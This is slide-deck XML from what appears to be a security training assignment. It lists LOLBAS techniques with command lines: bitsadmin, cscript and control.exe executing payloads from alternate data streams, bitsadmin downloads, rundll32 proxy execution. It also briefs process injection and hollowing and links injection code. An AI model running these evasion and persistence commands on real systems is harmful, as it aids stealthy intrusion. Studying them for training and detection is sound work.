              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> C:\Windows\Temp\*.sct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (should return "File Not Found")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="8"/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Force terminate regsvr32 if it hangs after execution: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>taskkill</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> /F /IM regsvr32.exe</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9140641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0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Part 3 ○ Explore the LOLBAS Project website and identify 3 more binaries that can be used for execution or persistence.</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1. Bitsadmin.exe</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Description:</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Bitsadmin.exe is a command-line tool for managing the Background Intelligent Transfer Service (BITS). It can be abused to create BITS jobs that download and execute files, often from alternate data streams (ADS) to evade detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Execute from Alternate Data Stream (Persistence/Evasion):</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bitsadmin</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/create 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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addfile</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1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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SetNotifyCmdLine</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1 c:\data\playfolder\1.txt:cmd.exe NULL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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/RESUME 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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/complete 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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Performs execution of a specified file from an alternate data stream, can be used as a defensive evasion or persistence technique.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2120214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0" y="152400"/>
            <a:ext cx="11830050" cy="6705600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Download file from Internet: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bitsadmin</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/create 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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addfile</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1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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/RESUME 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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bitsadmin</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/complete 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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Download file from the Internet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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One-liner execution:</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bitsadmin</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/create 1 &amp; </a:t>
            </a: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bitsadmin</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addfile</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1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe &amp; </a:t>
            </a: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bitsadmin</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SetNotifyCmdLine</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1 c:\data\playfolder\1.txt:cmd.exe NULL &amp; </a:t>
            </a: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bitsadmin</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/RESUME 1 &amp; </a:t>
            </a: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bitsadmin</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/complete 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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Performs execution of specified file in an alternate data stream.</a:t>
            </a:r>
          </a:p>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2. Cscript.exe</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Description:</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Cscript.exe is the Windows Script Host command-line tool for executing scripts (e.g., VBScript, JScript). It can be used to run scripts from alternate data streams.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2356358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0" y="0"/>
            <a:ext cx="12058650" cy="6553200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Execute Visual Basic script stored in an Alternate Data Stream (ADS):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err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cscript</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800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>e:vbscript</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 C:\Windows\Temp\file.ext:script.vbs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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 Can be used to evade defensive countermeasures or to hide as a persistence mechanism.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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3. Control.exe</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Description:</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 Control.exe is the legitimate Windows binary used to launch Control Panel items. It can be hijacked to execute arbitrary .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cpl</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 (Control Panel) files or DLLs stored in alternate data streams.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Execute </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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cpl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> file (DLL with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CPlApplet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> export function):</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effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>control.exe C:\Windows\Temp\file.cpl</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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 Use to execute code and bypass application whitelisting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Execute DLL stored in an Alternate Data Stream (ADS):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kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>control.exe C:\Windows\Temp\file.ext:evil.dll</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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 Can be used to evade defensive countermeasures or to hide as a persistence mechanism.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Additional Notable LOLBAS Binaries (Bonus):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800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Rundll32.exe</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 – Execute a DLL from an SMB share or ADS, or execute a JavaScript script that calls a remote script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Shdocvw.dll</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 – Launch an executable payload via proxy through a URL file by calling </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>OpenURL</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2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rundll32.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>shdocvw.dll,OpenURL</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 C:\Windows\Temp\file.url</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use case:</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 Load an executable payload by calling a .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>url</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 file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29194747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0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 04: Process Injection &amp; Hollowing </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● Description: Hide your malicious code inside a legitimate running process (like explorer.exe or notepad.exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● Technical Requirements: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Use a tool or a custom script (C++ or C#) to perform Process Injection. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Practice Process Hollowing: Start a legitimate process in a suspended state, replace its memory with your shellcode, and resume it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Verification: Use Process Hacker or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Suite to see if you can find the hidden shellcode inside the legitimate process. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● Learning Goal: Understand advanced memory forensics and how attackers stay invisible in a crowded system.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18441625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1" y="0"/>
            <a:ext cx="12191935" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Part 1 ○ Process Injection &amp; Hollowing — Use a tool or a custom script (C++ or C#) to perform Process Injection.</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C++ Implementation — Classic DLL Injection</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This C++ example demonstrates the classic DLL injection technique using standard Windows API calls. It injects a DLL into a target process by allocating memory, writing the DLL path, and creating a remote thread that calls </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LoadLibraryA</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to load the DLL.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Follow the link to get the code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Process-Injection.cpp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Explanation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Process-Injection.cpp/blob/main/Process%20Injection%20Explanation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>How it works:</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en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>OpenProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
